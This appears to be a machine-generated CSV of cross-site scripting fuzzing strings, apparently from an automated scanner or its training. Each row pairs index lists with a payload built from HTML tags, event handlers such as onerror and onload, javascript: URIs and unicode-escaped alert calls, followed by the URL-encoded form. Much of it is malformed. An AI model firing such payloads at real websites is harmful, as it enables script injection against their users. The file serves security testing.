body_tag,"[62, 66, 36, 27, 14]",alert``;prompt(1);<embed/<object/<body ,alert%60%60%3Bprompt%281%29%3B%3Cembed/%3Cobject/%3Cbody%20
body_tag,"[1, 22, 31, 62, 42]",</script><frameset><frame/</select>alert``;src=saivs.js ,%3C/script%3E%3Cframeset%3E%3Cframe/%3C/select%3Ealert%60%60%3Bsrc%3Dsaivs.js%20
body_tag,"[43, 14, 16, 56, 66]","type=""image"" <body <input onmouseover=alert();prompt(1);",type%3D%22image%22%20%3Cbody%20%3Cinput%20onmouseover%3Dalert%28%29%3Bprompt%281%29%3B
body_tag,"[67, 59, 59, 70, 74]",">alert();alert();"" ",%3Ealert%28%29%3Balert%28%29%3B%22%20
body_tag,"[47, 55, 48, 27, 56]","data=onload=alert();""onerror=javascript:alert();<object/onmouseover=alert();",data%3Donload%3Dalert%28%29%3B%22onerror%3Djavascript%3Aalert%28%29%3B%3Cobject/onmouseover%3Dalert%28%29%3B
body_tag,"[10, 22, 17, 14, 3]",<option/<frameset><frame/<input/<body <video><source/,%3Coption/%3Cframeset%3E%3Cframe/%3Cinput/%3Cbody%20%3Cvideo%3E%3Csource/
body_tag,"[64, 63, 17, 29, 56]",al\u0065rt``;\u0061lert``;<input/<select onmouseover=alert();,al%5Cu0065rt%60%60%3B%5Cu0061lert%60%60%3B%3Cinput/%3Cselect%20onmouseover%3Dalert%28%29%3B
body_tag,"[19, 56, 66, 53, 54]",<iframe/onmouseover=alert();prompt(1);javascript:al\u0065rt();onload=alert();,%3Ciframe/onmouseover%3Dalert%28%29%3Bprompt%281%29%3Bjavascript%3Aal%5Cu0065rt%28%29%3Bonload%3Dalert%28%29%3B
body_tag,"[41, 24, 47, 57, 4]","src=""data:text/html,<svg data=onerror=alert();<script ",src%3D%22data%3Atext/html%2C%3Csvg%20data%3Donerror%3Dalert%28%29%3B%3Cscript%20
body_tag,"[31, 35, 11, 24, 68]",</select><embed <img <svg  />,%3C/select%3E%3Cembed%20%3Cimg%20%3Csvg%20%20/%3E
body_tag,"[52, 9, 17, 58, 50]",javascript:\u0061lert();<option <input/saivs.js onerror=al\u0065rt();,javascript%3A%5Cu0061lert%28%29%3B%3Coption%20%3Cinput/saivs.js%20onerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[25, 30, 43, 0, 68]","<svg/<select/type=""image"" <script> />",%3Csvg/%3Cselect/type%3D%22image%22%20%3Cscript%3E%20/%3E
body_tag,"[18, 48, 46, 67, 12]","<iframe onerror=javascript:alert();data=""data:text/html,><img/",%3Ciframe%20onerror%3Djavascript%3Aalert%28%29%3Bdata%3D%22data%3Atext/html%2C%3E%3Cimg/
body_tag,"[16, 2, 35, 3, 39]",<input <video><source <embed <video><source/src=/ ,%3Cinput%20%3Cvideo%3E%3Csource%20%3Cembed%20%3Cvideo%3E%3Csource/src%3D/%20
body_tag,"[49, 74, 71, 25, 42]",onerror=\u0061lert(); '<svg/src=saivs.js ,onerror%3D%5Cu0061lert%28%29%3B%20%27%3Csvg/src%3Dsaivs.js%20
body_tag,"[28, 41, 56, 16, 3]","</object>src=""data:text/html,onmouseover=alert();<input <video><source/",%3C/object%3Esrc%3D%22data%3Atext/html%2Conmouseover%3Dalert%28%29%3B%3Cinput%20%3Cvideo%3E%3Csource/
body_tag,"[65, 45, 8, 33, 68]",confirm(1);data=saivs.html </a><canvas/ />,confirm%281%29%3Bdata%3Dsaivs.html%20%3C/a%3E%3Ccanvas/%20/%3E
body_tag,"[50, 54, 60, 71, 10]",onerror=al\u0065rt();onload=alert();\u0061lert();'<option/,onerror%3Dal%5Cu0065rt%28%29%3Bonload%3Dalert%28%29%3B%5Cu0061lert%28%29%3B%27%3Coption/
body_tag,"[45, 45, 64, 10, 73]",data=saivs.html data=saivs.html al\u0065rt``;<option//,data%3Dsaivs.html%20data%3Dsaivs.html%20al%5Cu0065rt%60%60%3B%3Coption//
body_tag,"[9, 47, 46, 41, 43]","<option data=data=""data:text/html,src=""data:text/html,type=""image"" ",%3Coption%20data%3Ddata%3D%22data%3Atext/html%2Csrc%3D%22data%3Atext/html%2Ctype%3D%22image%22%20
body_tag,"[74, 30, 43, 54, 50]"," <select/type=""image"" onload=alert();onerror=al\u0065rt();",%20%3Cselect/type%3D%22image%22%20onload%3Dalert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[58, 44, 47, 53, 65]","saivs.js type=""text/x-scriptlet"" data=javascript:al\u0065rt();confirm(1);",saivs.js%20type%3D%22text/x-scriptlet%22%20data%3Djavascript%3Aal%5Cu0065rt%28%29%3Bconfirm%281%29%3B
body_tag,"[57, 42, 70, 74, 14]","onerror=alert();src=saivs.js "" <body ",onerror%3Dalert%28%29%3Bsrc%3Dsaivs.js%20%22%20%3Cbody%20
body_tag,"[9, 50, 32, 36, 69]",<option onerror=al\u0065rt();<canvas <embed/<,%3Coption%20onerror%3Dal%5Cu0065rt%28%29%3B%3Ccanvas%20%3Cembed/%3C
body_tag,"[4, 24, 73, 49, 38]",<script <svg /onerror=\u0061lert();src=x ,%3Cscript%20%3Csvg%20/onerror%3D%5Cu0061lert%28%29%3Bsrc%3Dx%20
body_tag,"[26, 69, 64, 14, 57]",<object <al\u0065rt``;<body onerror=alert();,%3Cobject%20%3Cal%5Cu0065rt%60%60%3B%3Cbody%20onerror%3Dalert%28%29%3B
body_tag,"[12, 55, 17, 3, 8]","<img/onload=alert();""<input/<video><source/</a>",%3Cimg/onload%3Dalert%28%29%3B%22%3Cinput/%3Cvideo%3E%3Csource/%3C/a%3E
body_tag,"[57, 19, 28, 17, 28]",onerror=alert();<iframe/</object><input/</object>,onerror%3Dalert%28%29%3B%3Ciframe/%3C/object%3E%3Cinput/%3C/object%3E
body_tag,"[71, 34, 36, 61, 57]",'</canvas><embed/al\u0065rt();onerror=alert();,%27%3C/canvas%3E%3Cembed/al%5Cu0065rt%28%29%3Bonerror%3Dalert%28%29%3B
body_tag,"[68, 47, 60, 13, 26]", />data=\u0061lert();</img><object ,%20/%3Edata%3D%5Cu0061lert%28%29%3B%3C/img%3E%3Cobject%20
body_tag,"[72, 35, 13, 62, 1]",#<embed </img>alert``;</script>,%23%3Cembed%20%3C/img%3Ealert%60%60%3B%3C/script%3E
body_tag,"[21, 40, 28, 24, 20]",<frameset><frame src=  </object><svg </iframe>,%3Cframeset%3E%3Cframe%20src%3D%20%20%3C/object%3E%3Csvg%20%3C/iframe%3E
body_tag,"[61, 45, 42, 42, 72]",al\u0065rt();data=saivs.html src=saivs.js src=saivs.js #,al%5Cu0065rt%28%29%3Bdata%3Dsaivs.html%20src%3Dsaivs.js%20src%3Dsaivs.js%20%23
body_tag,"[58, 47, 22, 23, 59]",saivs.js data=<frameset><frame/</frameset>alert();,saivs.js%20data%3D%3Cframeset%3E%3Cframe/%3C/frameset%3Ealert%28%29%3B
body_tag,"[0, 31, 8, 24, 48]",<script></select></a><svg onerror=javascript:alert();,%3Cscript%3E%3C/select%3E%3C/a%3E%3Csvg%20onerror%3Djavascript%3Aalert%28%29%3B
body_tag,"[28, 45, 56, 37, 56]",</object>data=saivs.html onmouseover=alert();</embed>onmouseover=alert();,%3C/object%3Edata%3Dsaivs.html%20onmouseover%3Dalert%28%29%3B%3C/embed%3Eonmouseover%3Dalert%28%29%3B
body_tag,"[25, 62, 61, 48, 60]",<svg/alert``;al\u0065rt();onerror=javascript:alert();\u0061lert();,%3Csvg/alert%60%60%3Bal%5Cu0065rt%28%29%3Bonerror%3Djavascript%3Aalert%28%29%3B%5Cu0061lert%28%29%3B
body_tag,"[57, 66, 21, 63, 1]",onerror=alert();prompt(1);<frameset><frame \u0061lert``;</script>,onerror%3Dalert%28%29%3Bprompt%281%29%3B%3Cframeset%3E%3Cframe%20%5Cu0061lert%60%60%3B%3C/script%3E
body_tag,"[74, 34, 60, 16, 19]", </canvas>\u0061lert();<input <iframe/,%20%3C/canvas%3E%5Cu0061lert%28%29%3B%3Cinput%20%3Ciframe/
body_tag,"[58, 48, 12, 61, 51]",saivs.js onerror=javascript:alert();<img/al\u0065rt();javascript:alert();,saivs.js%20onerror%3Djavascript%3Aalert%28%29%3B%3Cimg/al%5Cu0065rt%28%29%3Bjavascript%3Aalert%28%29%3B
body_tag,"[31, 23, 68, 7, 2]",</select></frameset> /><a/<video><source ,%3C/select%3E%3C/frameset%3E%20/%3E%3Ca/%3Cvideo%3E%3Csource%20
body_tag,"[46, 38, 64, 58, 4]","data=""data:text/html,src=x al\u0065rt``;saivs.js <script ",data%3D%22data%3Atext/html%2Csrc%3Dx%20al%5Cu0065rt%60%60%3Bsaivs.js%20%3Cscript%20
body_tag,"[30, 23, 69, 57, 58]",<select/</frameset><onerror=alert();saivs.js ,%3Cselect/%3C/frameset%3E%3Conerror%3Dalert%28%29%3Bsaivs.js%20
body_tag,"[63, 47, 4, 20, 51]",\u0061lert``;data=<script </iframe>javascript:alert();,%5Cu0061lert%60%60%3Bdata%3D%3Cscript%20%3C/iframe%3Ejavascript%3Aalert%28%29%3B
body_tag,"[15, 70, 37, 69, 14]","<body/""</embed><<body ",%3Cbody/%22%3C/embed%3E%3C%3Cbody%20
body_tag,"[48, 51, 36, 68, 53]",onerror=javascript:alert();javascript:alert();<embed/ />javascript:al\u0065rt();,onerror%3Djavascript%3Aalert%28%29%3Bjavascript%3Aalert%28%29%3B%3Cembed/%20/%3Ejavascript%3Aal%5Cu0065rt%28%29%3B
body_tag,"[70, 71, 68, 10, 55]","""' /><option/onload=alert();""",%22%27%20/%3E%3Coption/onload%3Dalert%28%29%3B%22
body_tag,"[11, 67, 7, 49, 31]",<img ><a/onerror=\u0061lert();</select>,%3Cimg%20%3E%3Ca/onerror%3D%5Cu0061lert%28%29%3B%3C/select%3E
body_tag,"[26, 22, 32, 37, 70]","<object <frameset><frame/<canvas </embed>""",%3Cobject%20%3Cframeset%3E%3Cframe/%3Ccanvas%20%3C/embed%3E%22
body_tag,"[55, 13, 38, 57, 7]","onload=alert();""</img>src=x onerror=alert();<a/",onload%3Dalert%28%29%3B%22%3C/img%3Esrc%3Dx%20onerror%3Dalert%28%29%3B%3Ca/
body_tag,"[42, 18, 70, 27, 0]","src=saivs.js <iframe ""<object/<script>",src%3Dsaivs.js%20%3Ciframe%20%22%3Cobject/%3Cscript%3E
body_tag,"[38, 41, 71, 67, 47]","src=x src=""data:text/html,'>data=",src%3Dx%20src%3D%22data%3Atext/html%2C%27%3Edata%3D
body_tag,"[73, 21, 40, 16, 40]",/<frameset><frame src=  <input src=  ,/%3Cframeset%3E%3Cframe%20src%3D%20%20%3Cinput%20src%3D%20%20
body_tag,"[10, 37, 57, 9, 24]",<option/</embed>onerror=alert();<option <svg ,%3Coption/%3C/embed%3Eonerror%3Dalert%28%29%3B%3Coption%20%3Csvg%20
body_tag,"[45, 45, 26, 67, 12]",data=saivs.html data=saivs.html <object ><img/,data%3Dsaivs.html%20data%3Dsaivs.html%20%3Cobject%20%3E%3Cimg/
body_tag,"[17, 3, 51, 10, 56]",<input/<video><source/javascript:alert();<option/onmouseover=alert();,%3Cinput/%3Cvideo%3E%3Csource/javascript%3Aalert%28%29%3B%3Coption/onmouseover%3Dalert%28%29%3B
body_tag,"[37, 25, 6, 60, 15]",</embed><svg/<a \u0061lert();<body/,%3C/embed%3E%3Csvg/%3Ca%20%5Cu0061lert%28%29%3B%3Cbody/
body_tag,"[31, 8, 67, 65, 73]",</select></a>>confirm(1);/,%3C/select%3E%3C/a%3E%3Econfirm%281%29%3B/
body_tag,"[30, 55, 34, 74, 47]","<select/onload=alert();""</canvas> data=",%3Cselect/onload%3Dalert%28%29%3B%22%3C/canvas%3E%20data%3D
body_tag,"[47, 67, 2, 54, 56]",data=><video><source onload=alert();onmouseover=alert();,data%3D%3E%3Cvideo%3E%3Csource%20onload%3Dalert%28%29%3Bonmouseover%3Dalert%28%29%3B
body_tag,"[43, 48, 64, 61, 36]","type=""image"" onerror=javascript:alert();al\u0065rt``;al\u0065rt();<embed/",type%3D%22image%22%20onerror%3Djavascript%3Aalert%28%29%3Bal%5Cu0065rt%60%60%3Bal%5Cu0065rt%28%29%3B%3Cembed/
body_tag,"[43, 31, 0, 62, 16]","type=""image"" </select><script>alert``;<input ",type%3D%22image%22%20%3C/select%3E%3Cscript%3Ealert%60%60%3B%3Cinput%20
body_tag,"[63, 61, 55, 54, 35]","\u0061lert``;al\u0065rt();onload=alert();""onload=alert();<embed ",%5Cu0061lert%60%60%3Bal%5Cu0065rt%28%29%3Bonload%3Dalert%28%29%3B%22onload%3Dalert%28%29%3B%3Cembed%20
body_tag,"[4, 14, 74, 58, 5]",<script <body  saivs.js <script/,%3Cscript%20%3Cbody%20%20saivs.js%20%3Cscript/
body_tag,"[62, 28, 54, 13, 34]",alert``;</object>onload=alert();</img></canvas>,alert%60%60%3B%3C/object%3Eonload%3Dalert%28%29%3B%3C/img%3E%3C/canvas%3E
body_tag,"[11, 53, 42, 73, 59]",<img javascript:al\u0065rt();src=saivs.js /alert();,%3Cimg%20javascript%3Aal%5Cu0065rt%28%29%3Bsrc%3Dsaivs.js%20/alert%28%29%3B
body_tag,"[42, 35, 27, 6, 19]",src=saivs.js <embed <object/<a <iframe/,src%3Dsaivs.js%20%3Cembed%20%3Cobject/%3Ca%20%3Ciframe/
body_tag,"[35, 0, 36, 2, 28]",<embed <script><embed/<video><source </object>,%3Cembed%20%3Cscript%3E%3Cembed/%3Cvideo%3E%3Csource%20%3C/object%3E
body_tag,"[23, 24, 0, 16, 49]",</frameset><svg <script><input onerror=\u0061lert();,%3C/frameset%3E%3Csvg%20%3Cscript%3E%3Cinput%20onerror%3D%5Cu0061lert%28%29%3B
body_tag,"[12, 1, 13, 69, 13]",<img/</script></img><</img>,%3Cimg/%3C/script%3E%3C/img%3E%3C%3C/img%3E
body_tag,"[53, 74, 5, 5, 17]",javascript:al\u0065rt(); <script/<script/<input/,javascript%3Aal%5Cu0065rt%28%29%3B%20%3Cscript/%3Cscript/%3Cinput/
body_tag,"[9, 62, 47, 62, 67]",<option alert``;data=alert``;>,%3Coption%20alert%60%60%3Bdata%3Dalert%60%60%3B%3E
body_tag,"[57, 59, 65, 25, 48]",onerror=alert();alert();confirm(1);<svg/onerror=javascript:alert();,onerror%3Dalert%28%29%3Balert%28%29%3Bconfirm%281%29%3B%3Csvg/onerror%3Djavascript%3Aalert%28%29%3B
body_tag,"[44, 4, 24, 39, 28]","type=""text/x-scriptlet"" <script <svg src=/ </object>",type%3D%22text/x-scriptlet%22%20%3Cscript%20%3Csvg%20src%3D/%20%3C/object%3E
body_tag,"[32, 45, 16, 28, 17]",<canvas data=saivs.html <input </object><input/,%3Ccanvas%20data%3Dsaivs.html%20%3Cinput%20%3C/object%3E%3Cinput/
body_tag,"[44, 32, 17, 35, 69]","type=""text/x-scriptlet"" <canvas <input/<embed <",type%3D%22text/x-scriptlet%22%20%3Ccanvas%20%3Cinput/%3Cembed%20%3C
body_tag,"[61, 56, 31, 3, 10]",al\u0065rt();onmouseover=alert();</select><video><source/<option/,al%5Cu0065rt%28%29%3Bonmouseover%3Dalert%28%29%3B%3C/select%3E%3Cvideo%3E%3Csource/%3Coption/
body_tag,"[70, 56, 50, 10, 34]","""onmouseover=alert();onerror=al\u0065rt();<option/</canvas>",%22onmouseover%3Dalert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3B%3Coption/%3C/canvas%3E
body_tag,"[50, 63, 34, 63, 61]",onerror=al\u0065rt();\u0061lert``;</canvas>\u0061lert``;al\u0065rt();,onerror%3Dal%5Cu0065rt%28%29%3B%5Cu0061lert%60%60%3B%3C/canvas%3E%5Cu0061lert%60%60%3Bal%5Cu0065rt%28%29%3B
body_tag,"[53, 18, 17, 23, 23]",javascript:al\u0065rt();<iframe <input/</frameset></frameset>,javascript%3Aal%5Cu0065rt%28%29%3B%3Ciframe%20%3Cinput/%3C/frameset%3E%3C/frameset%3E
body_tag,"[31, 15, 10, 23, 41]","</select><body/<option/</frameset>src=""data:text/html,",%3C/select%3E%3Cbody/%3Coption/%3C/frameset%3Esrc%3D%22data%3Atext/html%2C
body_tag,"[67, 17, 25, 20, 41]","><input/<svg/</iframe>src=""data:text/html,",%3E%3Cinput/%3Csvg/%3C/iframe%3Esrc%3D%22data%3Atext/html%2C
body_tag,"[62, 47, 11, 37, 72]",alert``;data=<img </embed>#,alert%60%60%3Bdata%3D%3Cimg%20%3C/embed%3E%23
body_tag,"[60, 1, 9, 54, 71]",\u0061lert();</script><option onload=alert();',%5Cu0061lert%28%29%3B%3C/script%3E%3Coption%20onload%3Dalert%28%29%3B%27
body_tag,"[66, 27, 74, 6, 4]",prompt(1);<object/ <a <script ,prompt%281%29%3B%3Cobject/%20%3Ca%20%3Cscript%20
body_tag,"[46, 35, 59, 19, 63]","data=""data:text/html,<embed alert();<iframe/\u0061lert``;",data%3D%22data%3Atext/html%2C%3Cembed%20alert%28%29%3B%3Ciframe/%5Cu0061lert%60%60%3B
body_tag,"[24, 25, 67, 21, 58]",<svg <svg/><frameset><frame saivs.js ,%3Csvg%20%3Csvg/%3E%3Cframeset%3E%3Cframe%20saivs.js%20
body_tag,"[19, 34, 12, 24, 23]",<iframe/</canvas><img/<svg </frameset>,%3Ciframe/%3C/canvas%3E%3Cimg/%3Csvg%20%3C/frameset%3E
body_tag,"[5, 11, 36, 43, 42]","<script/<img <embed/type=""image"" src=saivs.js ",%3Cscript/%3Cimg%20%3Cembed/type%3D%22image%22%20src%3Dsaivs.js%20
body_tag,"[62, 1, 9, 31, 9]",alert``;</script><option </select><option ,alert%60%60%3B%3C/script%3E%3Coption%20%3C/select%3E%3Coption%20
body_tag,"[47, 70, 16, 67, 8]","data=""<input ></a>",data%3D%22%3Cinput%20%3E%3C/a%3E
body_tag,"[21, 55, 34, 49, 14]","<frameset><frame onload=alert();""</canvas>onerror=\u0061lert();<body ",%3Cframeset%3E%3Cframe%20onload%3Dalert%28%29%3B%22%3C/canvas%3Eonerror%3D%5Cu0061lert%28%29%3B%3Cbody%20
body_tag,"[17, 21, 71, 45, 36]",<input/<frameset><frame 'data=saivs.html <embed/,%3Cinput/%3Cframeset%3E%3Cframe%20%27data%3Dsaivs.html%20%3Cembed/
body_tag,"[66, 9, 58, 8, 46]","prompt(1);<option saivs.js </a>data=""data:text/html,",prompt%281%29%3B%3Coption%20saivs.js%20%3C/a%3Edata%3D%22data%3Atext/html%2C
body_tag,"[70, 34, 11, 12, 18]","""</canvas><img <img/<iframe ",%22%3C/canvas%3E%3Cimg%20%3Cimg/%3Ciframe%20
body_tag,"[24, 19, 73, 47, 26]",<svg <iframe//data=<object ,%3Csvg%20%3Ciframe//data%3D%3Cobject%20
body_tag,"[20, 70, 50, 35, 55]","</iframe>""onerror=al\u0065rt();<embed onload=alert();""",%3C/iframe%3E%22onerror%3Dal%5Cu0065rt%28%29%3B%3Cembed%20onload%3Dalert%28%29%3B%22
body_tag,"[9, 68, 2, 22, 62]",<option  /><video><source <frameset><frame/alert``;,%3Coption%20%20/%3E%3Cvideo%3E%3Csource%20%3Cframeset%3E%3Cframe/alert%60%60%3B
body_tag,"[50, 1, 37, 55, 26]","onerror=al\u0065rt();</script></embed>onload=alert();""<object ",onerror%3Dal%5Cu0065rt%28%29%3B%3C/script%3E%3C/embed%3Eonload%3Dalert%28%29%3B%22%3Cobject%20
body_tag,"[32, 63, 53, 44, 24]","<canvas \u0061lert``;javascript:al\u0065rt();type=""text/x-scriptlet"" <svg ",%3Ccanvas%20%5Cu0061lert%60%60%3Bjavascript%3Aal%5Cu0065rt%28%29%3Btype%3D%22text/x-scriptlet%22%20%3Csvg%20
body_tag,"[72, 24, 4, 5, 5]",#<svg <script <script/<script/,%23%3Csvg%20%3Cscript%20%3Cscript/%3Cscript/
body_tag,"[29, 15, 70, 71, 4]","<select <body/""'<script ",%3Cselect%20%3Cbody/%22%27%3Cscript%20
body_tag,"[50, 22, 10, 59, 42]",onerror=al\u0065rt();<frameset><frame/<option/alert();src=saivs.js ,onerror%3Dal%5Cu0065rt%28%29%3B%3Cframeset%3E%3Cframe/%3Coption/alert%28%29%3Bsrc%3Dsaivs.js%20
body_tag,"[11, 37, 58, 6, 7]",<img </embed>saivs.js <a <a/,%3Cimg%20%3C/embed%3Esaivs.js%20%3Ca%20%3Ca/
body_tag,"[49, 41, 28, 72, 46]","onerror=\u0061lert();src=""data:text/html,</object>#data=""data:text/html,",onerror%3D%5Cu0061lert%28%29%3Bsrc%3D%22data%3Atext/html%2C%3C/object%3E%23data%3D%22data%3Atext/html%2C
body_tag,"[54, 15, 8, 31, 24]",onload=alert();<body/</a></select><svg ,onload%3Dalert%28%29%3B%3Cbody/%3C/a%3E%3C/select%3E%3Csvg%20
body_tag,"[23, 42, 8, 62, 57]",</frameset>src=saivs.js </a>alert``;onerror=alert();,%3C/frameset%3Esrc%3Dsaivs.js%20%3C/a%3Ealert%60%60%3Bonerror%3Dalert%28%29%3B
body_tag,"[7, 70, 22, 18, 8]","<a/""<frameset><frame/<iframe </a>",%3Ca/%22%3Cframeset%3E%3Cframe/%3Ciframe%20%3C/a%3E
body_tag,"[7, 23, 2, 72, 50]",<a/</frameset><video><source #onerror=al\u0065rt();,%3Ca/%3C/frameset%3E%3Cvideo%3E%3Csource%20%23onerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[64, 10, 12, 10, 56]",al\u0065rt``;<option/<img/<option/onmouseover=alert();,al%5Cu0065rt%60%60%3B%3Coption/%3Cimg/%3Coption/onmouseover%3Dalert%28%29%3B
body_tag,"[74, 32, 38, 32, 55]"," <canvas src=x <canvas onload=alert();""",%20%3Ccanvas%20src%3Dx%20%3Ccanvas%20onload%3Dalert%28%29%3B%22
body_tag,"[65, 28, 50, 48, 49]",confirm(1);</object>onerror=al\u0065rt();onerror=javascript:alert();onerror=\u0061lert();,confirm%281%29%3B%3C/object%3Eonerror%3Dal%5Cu0065rt%28%29%3Bonerror%3Djavascript%3Aalert%28%29%3Bonerror%3D%5Cu0061lert%28%29%3B
body_tag,"[53, 14, 11, 15, 39]",javascript:al\u0065rt();<body <img <body/src=/ ,javascript%3Aal%5Cu0065rt%28%29%3B%3Cbody%20%3Cimg%20%3Cbody/src%3D/%20
body_tag,"[69, 5, 36, 46, 11]","<<script/<embed/data=""data:text/html,<img ",%3C%3Cscript/%3Cembed/data%3D%22data%3Atext/html%2C%3Cimg%20
body_tag,"[16, 45, 1, 11, 14]",<input data=saivs.html </script><img <body ,%3Cinput%20data%3Dsaivs.html%20%3C/script%3E%3Cimg%20%3Cbody%20
body_tag,"[27, 73, 65, 28, 39]",<object//confirm(1);</object>src=/ ,%3Cobject//confirm%281%29%3B%3C/object%3Esrc%3D/%20
body_tag,"[6, 70, 34, 21, 38]","<a ""</canvas><frameset><frame src=x ",%3Ca%20%22%3C/canvas%3E%3Cframeset%3E%3Cframe%20src%3Dx%20
body_tag,"[4, 45, 70, 70, 14]","<script data=saivs.html """"<body ",%3Cscript%20data%3Dsaivs.html%20%22%22%3Cbody%20
body_tag,"[20, 36, 29, 21, 71]",</iframe><embed/<select <frameset><frame ',%3C/iframe%3E%3Cembed/%3Cselect%20%3Cframeset%3E%3Cframe%20%27
body_tag,"[20, 74, 39, 43, 31]","</iframe> src=/ type=""image"" </select>",%3C/iframe%3E%20src%3D/%20type%3D%22image%22%20%3C/select%3E
body_tag,"[73, 63, 2, 37, 71]",/\u0061lert``;<video><source </embed>',/%5Cu0061lert%60%60%3B%3Cvideo%3E%3Csource%20%3C/embed%3E%27
body_tag,"[54, 70, 59, 62, 36]","onload=alert();""alert();alert``;<embed/",onload%3Dalert%28%29%3B%22alert%28%29%3Balert%60%60%3B%3Cembed/
body_tag,"[49, 29, 73, 55, 65]","onerror=\u0061lert();<select /onload=alert();""confirm(1);",onerror%3D%5Cu0061lert%28%29%3B%3Cselect%20/onload%3Dalert%28%29%3B%22confirm%281%29%3B
body_tag,"[34, 21, 51, 41, 52]","</canvas><frameset><frame javascript:alert();src=""data:text/html,javascript:\u0061lert();",%3C/canvas%3E%3Cframeset%3E%3Cframe%20javascript%3Aalert%28%29%3Bsrc%3D%22data%3Atext/html%2Cjavascript%3A%5Cu0061lert%28%29%3B
body_tag,"[52, 42, 42, 13, 20]",javascript:\u0061lert();src=saivs.js src=saivs.js </img></iframe>,javascript%3A%5Cu0061lert%28%29%3Bsrc%3Dsaivs.js%20src%3Dsaivs.js%20%3C/img%3E%3C/iframe%3E
body_tag,"[10, 40, 15, 20, 0]",<option/src=  <body/</iframe><script>,%3Coption/src%3D%20%20%3Cbody/%3C/iframe%3E%3Cscript%3E
body_tag,"[45, 2, 65, 74, 67]",data=saivs.html <video><source confirm(1); >,data%3Dsaivs.html%20%3Cvideo%3E%3Csource%20confirm%281%29%3B%20%3E
body_tag,"[69, 57, 26, 40, 33]",<onerror=alert();<object src=  <canvas/,%3Conerror%3Dalert%28%29%3B%3Cobject%20src%3D%20%20%3Ccanvas/
body_tag,"[24, 55, 71, 25, 8]","<svg onload=alert();""'<svg/</a>",%3Csvg%20onload%3Dalert%28%29%3B%22%27%3Csvg/%3C/a%3E
body_tag,"[67, 27, 48, 60, 37]",><object/onerror=javascript:alert();\u0061lert();</embed>,%3E%3Cobject/onerror%3Djavascript%3Aalert%28%29%3B%5Cu0061lert%28%29%3B%3C/embed%3E
body_tag,"[2, 7, 61, 59, 35]",<video><source <a/al\u0065rt();alert();<embed ,%3Cvideo%3E%3Csource%20%3Ca/al%5Cu0065rt%28%29%3Balert%28%29%3B%3Cembed%20
body_tag,"[17, 69, 29, 58, 39]",<input/<<select saivs.js src=/ ,%3Cinput/%3C%3Cselect%20saivs.js%20src%3D/%20
body_tag,"[56, 7, 52, 14, 66]",onmouseover=alert();<a/javascript:\u0061lert();<body prompt(1);,onmouseover%3Dalert%28%29%3B%3Ca/javascript%3A%5Cu0061lert%28%29%3B%3Cbody%20prompt%281%29%3B
body_tag,"[65, 29, 67, 13, 60]",confirm(1);<select ></img>\u0061lert();,confirm%281%29%3B%3Cselect%20%3E%3C/img%3E%5Cu0061lert%28%29%3B
body_tag,"[56, 14, 39, 26, 0]",onmouseover=alert();<body src=/ <object <script>,onmouseover%3Dalert%28%29%3B%3Cbody%20src%3D/%20%3Cobject%20%3Cscript%3E
body_tag,"[30, 36, 22, 28, 12]",<select/<embed/<frameset><frame/</object><img/,%3Cselect/%3Cembed/%3Cframeset%3E%3Cframe/%3C/object%3E%3Cimg/
body_tag,"[56, 58, 21, 28, 11]",onmouseover=alert();saivs.js <frameset><frame </object><img ,onmouseover%3Dalert%28%29%3Bsaivs.js%20%3Cframeset%3E%3Cframe%20%3C/object%3E%3Cimg%20
body_tag,"[35, 34, 3, 1, 63]",<embed </canvas><video><source/</script>\u0061lert``;,%3Cembed%20%3C/canvas%3E%3Cvideo%3E%3Csource/%3C/script%3E%5Cu0061lert%60%60%3B
body_tag,"[15, 45, 73, 61, 30]",<body/data=saivs.html /al\u0065rt();<select/,%3Cbody/data%3Dsaivs.html%20/al%5Cu0065rt%28%29%3B%3Cselect/
body_tag,"[29, 5, 53, 1, 57]",<select <script/javascript:al\u0065rt();</script>onerror=alert();,%3Cselect%20%3Cscript/javascript%3Aal%5Cu0065rt%28%29%3B%3C/script%3Eonerror%3Dalert%28%29%3B
body_tag,"[46, 0, 14, 15, 32]","data=""data:text/html,<script><body <body/<canvas ",data%3D%22data%3Atext/html%2C%3Cscript%3E%3Cbody%20%3Cbody/%3Ccanvas%20
body_tag,"[61, 42, 33, 29, 36]",al\u0065rt();src=saivs.js <canvas/<select <embed/,al%5Cu0065rt%28%29%3Bsrc%3Dsaivs.js%20%3Ccanvas/%3Cselect%20%3Cembed/
